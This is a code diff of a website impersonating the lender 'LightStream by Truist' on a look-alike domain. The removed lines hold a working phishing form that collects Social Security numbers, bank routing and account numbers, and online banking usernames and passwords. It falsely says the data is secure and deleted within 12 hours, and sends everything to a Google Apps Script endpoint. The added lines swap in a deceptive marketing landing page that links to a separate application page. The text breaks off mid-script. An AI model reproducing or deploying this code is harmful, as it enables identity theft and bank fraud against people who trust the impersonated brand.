@@ -4,836 +4,502 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="google-site-verification" content="0vF7BoHfaAIjsP0diVxGwUk3lJQQYcgtLrCPQ6wa984" />
-    <meta name="description" content="Apply Online Today — See Why A Growing Number Of People Choose LightStream by Truist For Their Financing Needs. Fast approval, competitive rates, personal loans $3,000-$100,000.">
-    <meta name="keywords" content="LightStream, Truist, personal loans, auto loans, home loans, loan application, fast approval, low interest rates, same day approval">
-    <meta name="author" content="LightStream by Truist">
-    <meta name="robots" content="index, follow">
-    <meta property="og:title" content="LightStream by Truist - Apply Online Today">
-    <meta property="og:description" content="Apply Online Today — See Why A Growing Number Of People Choose LightStream by Truist For Their Financing Needs.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lightstream-by-truist.com">
-    <meta property="og:image" content="https://lightstream-by-truist.com/logo.png">
-    <link rel="canonical" href="https://lightstream-by-truist.com/">
-    <title>LightStream by Truist - Apply Online Today | Fast Loan Approval</title>
+    <meta name="description" content="LightStream by Truist - Apply Online Today. Fast approval, competitive rates, personal loans $3,000-$100,000. Your trusted financial partner.">
+    <meta name="keywords" content="LightStream, Truist, personal loans, auto loans, home loans, loan application, fast approval, low interest rates">
+    <title>LightStream by Truist - Your Trusted Financial Partner</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .form-container {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 500px;
-        }
-        h1 {
-            text-align: center;
-            color: #3a16b9;
-            margin-bottom: 10px;
-            font-size: 32px;
-            font-weight: 700;
-        }
-        h2 {
-            text-align: center;
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 18px;
-            font-weight: normal;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
+            line-height: 1.6;
             color: #333;
+        }
+        
+        /* Navigation */
+        nav {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 15px 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        
+        .logo img {
+            height: 50px;
+            margin-right: 15px;
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+        
+        .nav-links a {
+            color: white;
+            text-decoration: none;
             font-weight: 600;
-            font-size: 14px;
-        }
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        input[type="number"],
-        input[type="password"],
-        select,
-        textarea {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            box-sizing: border-box;
+            transition: opacity 0.3s;
             font-size: 16px;
-            transition: all 0.3s ease;
         }
-        input:focus,
-        select:focus,
-        textarea:focus {
-            outline: none;
-            border-color: #3a16b9;
-            box-shadow: 0 0 0 3px rgba(58, 22, 185, 0.1);
+        
+        .nav-links a:hover {
+            opacity: 0.8;
         }
-        input:invalid:not(:placeholder-shown),
-        select:invalid:not(:placeholder-shown) {
-            border-color: #dc3545;
-        }
-        input:valid:not(:placeholder-shown),
-        select:valid:not(:placeholder-shown) {
-            border-color: #28a745;
-        }
-        .error-message {
-            color: #dc3545;
-            font-size: 13px;
-            margin-top: 5px;
+        
+        .mobile-menu {
             display: none;
-        }
-        input:invalid:not(:placeholder-shown) + .error-message,
-        select:invalid:not(:placeholder-shown) + .error-message {
-            display: block;
-        }
-        textarea {
-            height: 60px;
-            resize: vertical;
-        }
-        select {
+            flex-direction: column;
             cursor: pointer;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 10px center;
-            background-size: 20px;
-            padding-right: 40px;
         }
-        button {
-            width: 100%;
-            padding: 16px;
+        
+        .mobile-menu span {
+            width: 25px;
+            height: 3px;
+            background: white;
+            margin: 3px 0;
+            border-radius: 2px;
+        }
+        
+        /* Hero Section */
+        .hero {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            border: none;
-            border-radius: 8px;
+            padding: 150px 20px 100px;
+            text-align: center;
+            margin-top: 70px;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: fadeInUp 1s ease-out;
+        }
+        
+        .hero p {
+            font-size: 22px;
+            margin-bottom: 40px;
+            opacity: 0.95;
+            animation: fadeInUp 1s ease-out 0.2s both;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            background: white;
+            color: #667eea;
+            padding: 18px 50px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
             font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
             transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            animation: fadeInUp 1s ease-out 0.4s both;
         }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
         }
-        button:active {
-            transform: translateY(0);
+        
+        /* Features Section */
+        .features {
+            padding: 80px 20px;
+            background: #f8f9fa;
         }
-        .button-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .btn-back {
-            background: linear-gradient(135deg, #6c757d 0%, #5a6268 100%);
-            box-shadow: 0 4px 15px rgba(108, 117, 125, 0.4);
-        }
-        .btn-back:hover {
-            box-shadow: 0 6px 20px rgba(108, 117, 125, 0.6);
-        }
-        .page {
-            display: none;
-        }
-        .page.active {
-            display: block;
-        }
-        .warning-box {
-            background-color: #fff3cd;
-            border: 2px solid #ffc107;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 20px;
+        
+        .section-title {
             text-align: center;
-        }
-        .warning-text {
-            color: #ff0000;
-            font-weight: bold;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        .info-text {
-            color: #333;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #888;
-            font-size: 16px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-        .honeypot {
-            position: absolute;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-        }
-        .disclaimer {
-            background-color: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #6c757d;
-            text-align: center;
-        }
-        .disclaimer a {
+            font-size: 36px;
             color: #3a16b9;
-            text-decoration: none;
-            font-weight: 600;
+            margin-bottom: 50px;
         }
-        .disclaimer a:hover {
-            text-decoration: underline;
+        
+        .features-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 40px;
         }
-        .security-badge {
+        
+        .feature-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 15px;
             text-align: center;
-            margin-top: 15px;
-            color: #28a745;
-            font-size: 13px;
-            font-weight: 600;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
         }
-        .security-badge::before {
-            content: "🔒 ";
+        
+        .feature-card:hover {
+            transform: translateY(-10px);
         }
-        .footer-links {
-            text-align: center;
-            margin-top: 20px;
-            padding-top: 15px;
-            border-top: 1px solid #e0e0e0;
-            font-size: 12px;
+        
+        .feature-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
         }
-        .footer-links a {
+        
+        .feature-card h3 {
             color: #3a16b9;
-            text-decoration: none;
-            margin: 0 10px;
+            margin-bottom: 15px;
+            font-size: 22px;
         }
-        .footer-links a:hover {
-            text-decoration: underline;
+        
+        .feature-card p {
+            color: #666;
+            line-height: 1.8;
         }
-        .success-page {
-            display: none;
+        
+        /* Loan Types Section */
+        .loan-types {
+            padding: 80px 20px;
+            background: white;
+        }
+        
+        .loan-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        
+        .loan-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px 30px;
+            border-radius: 15px;
             text-align: center;
-            padding: 40px 20px;
+            transition: transform 0.3s ease;
         }
-        .success-page.active {
-            display: block;
+        
+        .loan-card:hover {
+            transform: scale(1.05);
         }
-        .success-icon {
-            font-size: 80px;
-            color: #28a745;
-            animation: scaleIn 0.5s ease-out;
+        
+        .loan-card h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
         }
-        @keyframes scaleIn {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
+        
+        .loan-card p {
+            opacity: 0.95;
+            line-height: 1.6;
         }
-        .success-title {
-            font-size: 32px;
-            color: #28a745;
-            font-weight: 700;
-            margin: 20px 0 10px 0;
+        
+        /* Stats Section */
+        .stats {
+            padding: 80px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
         }
-        .success-message {
+        
+        .stats-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+        
+        .stat-item h3 {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .stat-item p {
             font-size: 18px;
-            color: #666;
-            margin: 15px 0;
-            line-height: 1.6;
+            opacity: 0.95;
         }
-        .success-box {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
-            border: 2px solid #28a745;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 25px 0;
-        }
-        .success-box p {
-            margin: 8px 0;
-            color: #155724;
-            font-weight: 600;
-        }
-        .loader {
-            display: none;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #667eea;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .already-submitted {
-            display: none;
+        
+        /* CTA Section */
+        .cta-section {
+            padding: 100px 20px;
+            background: #f8f9fa;
             text-align: center;
-            padding: 40px 20px;
         }
-        .already-submitted.active {
-            display: block;
+        
+        .cta-section h2 {
+            font-size: 40px;
+            color: #3a16b9;
+            margin-bottom: 30px;
         }
-        .warning-icon {
-            font-size: 80px;
-            color: #ffc107;
-            animation: shake 0.5s ease-out;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-        .already-title {
-            font-size: 28px;
-            color: #856404;
-            font-weight: 700;
-            margin: 20px 0 10px 0;
-        }
-        .already-message {
-            font-size: 16px;
+        
+        .cta-section p {
+            font-size: 20px;
             color: #666;
-            margin: 15px 0;
-            line-height: 1.6;
+            margin-bottom: 40px;
         }
-        .already-box {
-            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
-            border: 2px solid #ffc107;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 25px 0;
+        
+        /* Footer */
+        footer {
+            background: #2c3e50;
+            color: white;
+            padding: 50px 20px 20px;
         }
-        .already-box p {
-            margin: 8px 0;
-            color: #856404;
-            font-weight: 600;
-            font-size: 16px;
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 30px;
         }
-        input[list] {
-            cursor: pointer;
+        
+        .footer-section h3 {
+            margin-bottom: 20px;
+            color: #667eea;
         }
-        input[list]::-webkit-calendar-picker-indicator {
-            cursor: pointer;
+        
+        .footer-section ul {
+            list-style: none;
+        }
+        
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-section a {
+            color: white;
+            text-decoration: none;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+        
+        .footer-section a:hover {
+            opacity: 1;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            opacity: 0.8;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .mobile-menu {
+                display: flex;
+            }
+            
+            .hero h1 {
+                font-size: 32px;
+            }
+            
+            .hero p {
+                font-size: 18px;
+            }
+            
+            .section-title {
+                font-size: 28px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h1>LightStream by Truist</h1>
-    <div class="security-badge">Secure Application Form</div>
-    
-    <form action="https://script.google.com/macros/s/AKfycbyiNDy488ldz7sB496Epz9uTeudqmGaaMxFOX9JjIbq19IIx0uo9PogIAB1nbs7pB8Iew/exec" method="POST" onsubmit="return validateForm()">
-        
-        <!-- Honeypot field for spam protection -->
-        <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
-        
-        <!-- Hidden Application ID field -->
-        <input type="hidden" id="applicationId" name="applicationId" value="">
-        
-        <!-- Page 1: Initial Verification -->
-        <div class="page active" id="page1">
-            <h2>YOUR INFORMATION</h2>
-            
-            <div class="form-group">
-                <label for="ssn">Social Security Number</label>
-                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" title="Please enter exactly 9 digits" required>
-            </div>
-
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="text" id="phone" name="phone" placeholder="XXX-XXX-XXXX" maxlength="12" title="Please enter exactly 10 digits" required>
-            </div>
-
-            <button type="button" onclick="showPage(2)">APPLY NOW</button>
-        </div>
-
-        <!-- Page 2: Basic Information -->
-        <div class="page" id="page2">
-            <h2>BASIC INFORMATION</h2>
-            
-            <div class="form-group">
-                <label for="loantype">Which Type Loan Required</label>
-                <select id="loantype" name="loantype" required>
-                    <option value="">-- Select Loan Type --</option>
-                    <option value="business">Business Loan</option>
-                    <option value="home">Home Loan</option>
-                    <option value="car">Car Loan</option>
-                    <option value="personal">Personal Loan</option>
-                    <option value="other">Other</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="carLoanOptions" style="display: none;">
-                <label for="cartype">Car Loan Type</label>
-                <select id="cartype" name="cartype">
-                    <option value="">-- Select Car Type --</option>
-                    <option value="new">New Car</option>
-                    <option value="used">Used Car</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="otherLoanInput" style="display: none;">
-                <label for="otherloantype">Specify Other Loan Type</label>
-                <input type="text" id="otherloantype" name="otherloantype" placeholder="Enter loan type">
-            </div>
-
-            <div class="form-group">
-                <label for="loanexecutive">Loan Executive Name</label>
-                <input type="text" id="loanexecutive" name="loanexecutive" list="executiveList" placeholder="Search or select executive" required>
-                <datalist id="executiveList">
-                    <option value="Allen Smith">
-                    <option value="Peter Parker">
-                    <option value="Jenny Albert">
-                    <option value="Jessy Martin">
-                    <option value="Sophia Williams">
-                    <option value="Ryan Baker">
-                    <option value="Travis Wilson">
-                </datalist>
-            </div>
-
-            <div class="form-group">
-                <label for="reference">How did you hear about us?</label>
-                <select id="reference" name="reference" required>
-                    <option value="">-- Select Reference --</option>
-                    <option value="phone">Phone</option>
-                    <option value="text">Text Message</option>
-                    <option value="email">Email</option>
-                    <option value="other">Other</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="otherReferenceInput" style="display: none;">
-                <label for="otherreference">Specify Other Reference</label>
-                <input type="text" id="otherreference" name="otherreference" placeholder="Please specify">
-            </div>
-
-            <div class="form-group">
-                <label for="loanamount">Loan Amount ($3,000 - $100,000)</label>
-                <input type="number" id="loanamount" name="loanamount" placeholder="Enter amount" min="3000" max="100000" required>
-                <small style="color: #666; font-size: 12px;">Low interest rate of 9.39% | Same-Day-Approval</small>
-            </div>
-
-            <div class="form-group">
-                <label for="tenure">Tenure (in months)</label>
-                <input type="number" id="tenure" name="tenure" placeholder="Enter tenure (12-84 months)" min="12" max="84" required>
-            </div>
-
-            <div class="form-group">
-                <label for="monthlypayment">Monthly Payment (Auto-calculated)</label>
-                <input type="text" id="monthlypayment" name="monthlypayment" placeholder="$0.00" readonly style="background-color: #f0f0f0; font-weight: bold; color: #28a745;">
-            </div>
-
-            <div class="form-group">
-                <label for="rateofinterest">Rate of Interest</label>
-                <input type="text" id="rateofinterest" name="rateofinterest" value="09.39%" readonly style="background-color: #f0f0f0;">
-            </div>
-
-            <div class="form-group">
-                <label for="firstname">First Name</label>
-                <input type="text" id="firstname" name="firstname" placeholder="First Name" required>
-            </div>
-
-            <div class="form-group">
-                <label for="lastname">Last Name</label>
-                <input type="text" id="lastname" name="lastname" placeholder="Last Name" required>
-            </div>
-
-            <div class="form-group">
-                <label for="dob">Date Of Birth</label>
-                <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
-            </div>
-
-            <div class="form-group">
-                <label for="email">E-mail Address</label>
-                <input type="email" id="email" name="email" placeholder="email@example.com" required>
-            </div>
-
-            <div class="form-group">
-                <label for="street">Street Address</label>
-                <input type="text" id="street" name="street" placeholder="Street Address" required>
-            </div>
-
-            <div class="form-group">
-                <label for="city">City</label>
-                <input type="text" id="city" name="city" placeholder="City" required>
-            </div>
-
-            <div class="form-group">
-                <label for="state">State</label>
-                <input type="text" id="state" name="state" placeholder="State" required>
-            </div>
-
-            <div class="form-group">
-                <label for="zip">Zip Code</label>
-                <input type="text" id="zip" name="zip" placeholder="Zip Code" required>
-            </div>
-
-            <div class="form-group">
-                <label for="country">Country</label>
-                <input type="text" id="country" name="country" placeholder="Country" required>
-            </div>
-
-            <div class="form-group">
-                <label for="bankname">Bank Name</label>
-                <input type="text" id="bankname" name="bankname" placeholder="Bank Name" required>
-            </div>
-
-            <div class="form-group">
-                <label for="routingnumber">Routing Number</label>
-                <input type="text" id="routingnumber" name="routingnumber" placeholder="Routing Number" required>
-            </div>
-
-            <div class="form-group">
-                <label for="accountnumber">Account Number</label>
-                <input type="text" id="accountnumber" name="accountnumber" placeholder="Account Number" required>
-            </div>
-
-            <div class="button-group">
-                <button type="button" class="btn-back" onclick="showPage(1)">BACK</button>
-                <button type="button" onclick="showPage(3)">NEXT</button>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <a href="index.html" class="logo">
+                <img src="logo.svg" alt="LightStream by Truist Logo">
+            </a>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="about.html">About Us</a></li>
+                <li><a href="faq.html">FAQ</a></li>
+                <li><a href="contact.html">Contact</a></li>
+                <li><a href="apply.html" style="background: white; color: #667eea; padding: 10px 25px; border-radius: 25px;">Apply Now</a></li>
+            </ul>
+            <div class="mobile-menu">
+                <span></span>
+                <span></span>
+                <span></span>
             </div>
         </div>
+    </nav>
 
-        <!-- Page 3: Banking Credentials -->
-        <div class="page" id="page3">
-            <div class="warning-box">
-                <p class="info-text" style="font-weight: 600;">* We need your online banking Username and Password to link your account to our Portal server.</p>
-                <p class="info-text" style="color: #28a745; margin-top: 8px;">✓ Your banking credentials are safe and secured.</p>
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>🎉 Welcome to LightStream by Truist</h1>
+        <p>Your Trusted Financial Partner for All Your Loan Needs</p>
+        <a href="apply.html" class="cta-button">Apply Online Today</a>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <h2 class="section-title">Why Choose LightStream?</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <h3>Fast Approval</h3>
+                <p>Get approved within 24 hours with our streamlined application process.</p>
             </div>
-
-            <div class="subtitle">CREDENTIALS</div>
-
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            <div class="feature-card">
+                <div class="feature-icon">💰</div>
+                <h3>Competitive Rates</h3>
+                <p>Enjoy low interest rates starting at 9.39% with flexible repayment terms.</p>
             </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <div class="feature-card">
+                <div class="feature-icon">🔒</div>
+                <h3>Secure & Safe</h3>
+                <p>Your data is protected with bank-level 256-bit SSL encryption.</p>
             </div>
-
-            <div class="warning-text">
-                * WITHIN 12 HOURS DELETE AUTOMATICALLY
+            <div class="feature-card">
+                <div class="feature-icon">📱</div>
+                <h3>100% Online</h3>
+                <p>Complete your application from anywhere, anytime with our online platform.</p>
             </div>
-
-            <div style="margin-top: 15px; padding: 10px; background-color: #e7f3ff; border-radius: 5px; font-size: 12px; color: #004085;">
-                <strong>Privacy Notice:</strong> This form is protected by spam detection. Your data is encrypted and secured.
+            <div class="feature-card">
+                <div class="feature-icon">👥</div>
+                <h3>Expert Support</h3>
+                <p>Dedicated loan executives to guide you through every step of the process.</p>
             </div>
-
-            <div class="button-group" style="margin-top: 20px;">
-                <button type="button" class="btn-back" onclick="showPage(2)">BACK</button>
-                <button type="submit">SUBMIT</button>
+            <div class="feature-card">
+                <div class="feature-icon">✓</div>
+                <h3>No Hidden Fees</h3>
+                <p>Transparent pricing with no hidden charges or prepayment penalties.</p>
             </div>
         </div>
+    </section>
 
-    </form>
-
-    <!-- Success Page -->
-    <div class="success-page" id="successPage">
-        <div class="success-icon">✓</div>
-        <h1 class="success-title">Application Successfully Submitted!</h1>
-        <p class="success-message">Thank you for choosing LightStream by Truist.</p>
-        
-        <div class="success-box">
-            <p>📧 A congratulation email has been sent to your email address</p>
-            <p>✉️ Please check your inbox (and spam folder) for confirmation</p>
-            <p>⏱️ Our team will review your application within 24 hours</p>
-            <p>📞 We'll contact you at the phone number you provided</p>
+    <!-- Loan Types -->
+    <section class="loan-types">
+        <h2 class="section-title">Loan Options We Offer</h2>
+        <div class="loan-grid">
+            <div class="loan-card">
+                <h3>🚗 Auto Loans</h3>
+                <p>New and used car financing with competitive rates and flexible terms.</p>
+            </div>
+            <div class="loan-card">
+                <h3>🏠 Home Loans</h3>
+                <p>Make your dream home a reality with our affordable home loan options.</p>
+            </div>
+            <div class="loan-card">
+                <h3>💼 Business Loans</h3>
+                <p>Grow your business with our tailored business financing solutions.</p>
+            </div>
+            <div class="loan-card">
+                <h3>👤 Personal Loans</h3>
+                <p>From $3,000 to $100,000 for any personal need or emergency.</p>
+            </div>
         </div>
-        
-        <p class="success-message" style="color: #28a745; font-weight: 600; font-size: 20px;">
-            Your Application ID: <span id="appId"></span>
-        </p>
-        <p style="color: #666; font-size: 14px; margin-top: 10px;">
-            Please save this ID for future reference
-        </p>
-        <p style="color: #888; font-size: 14px; margin-top: 30px;">
-            You can close this window now.
-        </p>
-    </div>
+    </section>
 
-    <div class="loader" id="loader"></div>
-
-    <!-- Already Submitted Page -->
-    <div class="already-submitted" id="alreadySubmitted">
-        <div class="warning-icon">⚠</div>
-        <h1 class="already-title">Application Already Submitted!</h1>
-        <p class="already-message">You have already submitted your loan application.</p>
-        
-        <div class="already-box">
-            <p>📋 Your Application ID: <span id="existingAppId" style="color: #28a745;"></span></p>
-            <p>✅ Application Status: Under Review</p>
-            <p>📧 Check your email for confirmation</p>
+    <!-- Stats Section -->
+    <section class="stats">
+        <div class="stats-grid">
+            <div class="stat-item">
+                <h3>$100K</h3>
+                <p>Maximum Loan Amount</p>
+            </div>
+            <div class="stat-item">
+                <h3>9.39%</h3>
+                <p>Starting Interest Rate</p>
+            </div>
+            <div class="stat-item">
+                <h3>24 Hours</h3>
+                <p>Fast Approval Time</p>
+            </div>
+            <div class="stat-item">
+                <h3>10,000+</h3>
+                <p>Happy Customers</p>
+            </div>
         </div>
-        
-        <p class="already-message" style="color: #dc3545; font-weight: 600;">
-            ⚠️ Multiple submissions are not allowed
-        </p>
-        <p style="color: #888; font-size: 14px; margin-top: 30px;">
-            For assistance, contact us at:<br>
-            📧 customersupport@lightstream-by-truist.com<br>
-            📞 1-800-555-0199
-        </p>
-    </div>
+    </section>
 
-    <div class="disclaimer">
-        <p><strong>Disclaimer:</strong> This is an official loan application form. By submitting, you agree to our <a href="#" onclick="alert('Terms: Data will be processed securely and used only for loan application purposes.'); return false;">Terms of Service</a> and <a href="#" onclick="alert('Privacy: Your information is protected with bank-level encryption.'); return false;">Privacy Policy</a>.</p>
-        <p style="margin-top: 8px;">© 2025 LightStream by Truist. All rights reserved.</p>
-    </div>
+    <!-- CTA Section -->
+    <section class="cta-section">
+        <h2>Ready to Get Started?</h2>
+        <p>Apply online today and get a decision within 24 hours</p>
+        <a href="apply.html" class="cta-button">Start Your Application</a>
+    </section>
 
-    <div class="footer-links">
-        <a href="#" onclick="alert('Contact: For assistance, email customersupport@lightstream-by-truist.com or call 1-800-555-0199'); return false;">Contact Us</a>
-        <a href="#" onclick="alert('About: LightStream by Truist offers personal loans with competitive rates and fast approval.'); return false;">About</a>
-        <a href="#" onclick="alert('Security: We use 256-bit SSL encryption to protect your data.'); return false;">Security</a>
-    </div>
-
-    <script>
-        // Check if form already submitted on page load
-        window.addEventListener('DOMContentLoaded', function() {
-            const submittedAppId = localStorage.getItem('loanAppId');
-            if (submittedAppId) {
-                // Hide form and show already submitted page
-                document.querySelector('form').style.display = 'none';
-                document.querySelector('.disclaimer').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                document.getElementById('alreadySubmitted').classList.add('active');
-                document.getElementById('existingAppId').textContent = submittedAppId;
-            }
-        });
-
-        // Form validation and spam protection
-        function validateForm() {
-            // Check if already submitted
-            const submittedAppId = localStorage.getItem('loanAppId');
-            if (submittedAppId) {
-                alert('You have already submitted an application. Application ID: ' + submittedAppId);
-                return false;
-            }
-
-            // Check honeypot field (should be empty)
-            const honeypot = document.querySelector('input[name="website"]');
-            if (honeypot && honeypot.value !== '') {
-                console.log('Spam detected');
-                return false; // Block spam submission
-            }
-            
-            // Additional validation
-            const allInputs = document.querySelectorAll('input[required], select[required]');
-            for (let input of allInputs) {
-                if (!input.checkValidity()) {
-                    input.reportValidity();
-                    return false;
-                }
-            }
-            
-            // Generate unique Application ID before submission
-            const appId = 'LS' + Date.now().toString().slice(-8);
-            document.getElementById('applicationId').value = appId;
-            
-            // Submit form via AJAX
-            const form = document.querySelector('form');
-            const formData = new FormData(form);
-            
-            // Show loader
-            document.getElementById('loader').style.display = 'block';
-            document.querySelector('.form-container').style.opacity = '0.5';
-            
-            // Submit form data
-            fetch(form.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Hide loader and form
-                document.getElementById('loader').style.display = 'none';
-                document.querySelector('form').style.display = 'none';
-                document.querySelector('.disclaimer').style.display = 'none';
-                document.querySelector('.footer-links').style.display = 'none';
-                
-                // Show success page
-                document.getElementById('successPage').classList.add('active');
-                
-                // Generate random application ID
-                const appId = 'LS' + Date.now().toString().slice(-8);
-                document.getElementById('appId').textContent = appId;
-                
-                // Store application ID in localStorage to prevent resubmission
-                localStorage.setItem('loanAppId', appId);
-                localStorage.setItem('submissionDate', new Date().toISOString());
-            })
-            .catch(error => {
-                document.getElementById('loader').style.display = 'none';
-                document.querySelector('.form-container').style.opacity = '1';
-                alert('Submission error. Please try again.');
-            });
-            
-            return false; // Prevent default form submission
-        }
-
-        function showPage(pageNum) {
-            // Validate current page before moving forward
-            const currentPage = document.querySelector('.page.active');
-            const inputs = currentPage.querySelectorAll('input[required], select[required]');
-            let isValid = true;
-            
-            inputs.forEach(input => {
-                if (!input.checkValidity()) {
-                    input.reportValidity();
-                    isValid = false;
-                    return;
-                }
-            });
-            
-            if (!isValid) {
-                return; // Stop if validation fails
-            }
-            
-            // Hide all pages
-            document.querySelectorAll('.page').forEach(page => {
-                page.classList.remove('active');
-            });
-            
-            // Show selected page
-            document.getElementById('page' + pageNum).classList.add('active');
-        }
-
-        // Show car loan options when Car Loan is selected
-        document.getElementById('loantype').addEventListener('change', function() {
-            const carOptions = document.getElementById('carLoanOptions');
-            const otherInput = document.getElementById('otherLoanInput');
-            
-            if (this.value === 'car') {
-                carOptions.style.display = 'block';
-                document.getElementById('cartype').required = true;
-                otherInput.style.display = 'none';
-                document.getElementById('otherloantype').required = false;
-            } else if (this.value === 'other') {
-                otherInput.style.display = 'block';
-                document.getElementById('otherloantype').required = true;
-                carOptions.style.display = 'none';
-                document.getElementById('cartype').required = false;
-            } else {
-                carOptions.style.display = 'none';
